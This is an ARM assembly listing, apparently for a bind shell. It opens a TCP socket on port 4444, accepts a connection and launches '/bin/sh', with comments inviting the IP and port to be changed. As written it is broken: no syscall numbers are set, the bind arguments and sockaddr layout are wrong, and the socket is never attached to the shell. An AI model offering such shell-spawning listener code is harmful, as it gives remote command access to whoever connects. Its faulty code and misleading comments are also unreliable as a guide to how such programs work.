.global _start

.section .data
    ip_address: .asciz "127.0.0.1"  # IP address (replace as needed)
    port_number: .word 4444         # Port number (change as needed)

    sockaddr_in_struct:
        .word 2                     # sin_family (AF_INET)
        .word 0x115c                 # sin_port (port 4444 in network byte order)
        .space 4                     # Padding (for alignment)
        .word 0x0100007f             # sin_addr (127.0.0.1 in network byte order)

    shell_command: .asciz "/bin/sh"  # Command to spawn a shell

.section .bss
    sockfd: .skip 4
    client_sockfd: .skip 4  # Buffer to store the client socket descriptor

.section .text
_start:
    # Step 1: Create the socket
    mov r0, #2                # AF_INET (IPv4)
    mov r1, #1                # SOCK_STREAM (TCP socket)
    mov r2, #0                # Protocol
    svc 0                      # syscall: socket()
    mov r4, r0                # Save the socket file descriptor in r4

    # Step 2: Save the value of r0 (IP address) and r1, r2 to the stack (important for later)
    push {r0, r1, r2}         # Save registers before overwriting them

    # Step 3: Load sockaddr_in structure
    ldr r0, =sockaddr_in_struct  # Load address of sockaddr_in structure

    # Step 4: Bind the socket to the local address
    mov r1, r4                # Socket descriptor (reuse r1)
    svc 0                      # syscall: bind()

    # Step 5: Listen for incoming connections
    mov r0, r4                # Socket descriptor
    mov r1, #5                # Backlog size
    svc 0                      # syscall: listen()

    # Step 6: Accept incoming connection
    mov r0, r4                # Socket descriptor
    ldr r1, =client_sockfd     # Load the address of the buffer to store the new socket descriptor
    mov r2, #0                # Optional (set to 0 if you don't care about the client's address)
    svc 0                      # syscall: accept()

    # Step 7: Now we have a new socket descriptor in client_sockfd
    # You can use this client_sockfd to communicate with the client.

    # Step 8: Restore r0, r1, r2 from the stack
    pop {r0, r1, r2}          # Restore saved registers

    # Step 9: Create a shell (reuse r0 for the shell command)
    ldr r0, =shell_command    # Load the shell command
    svc 0                      # syscall: execve()
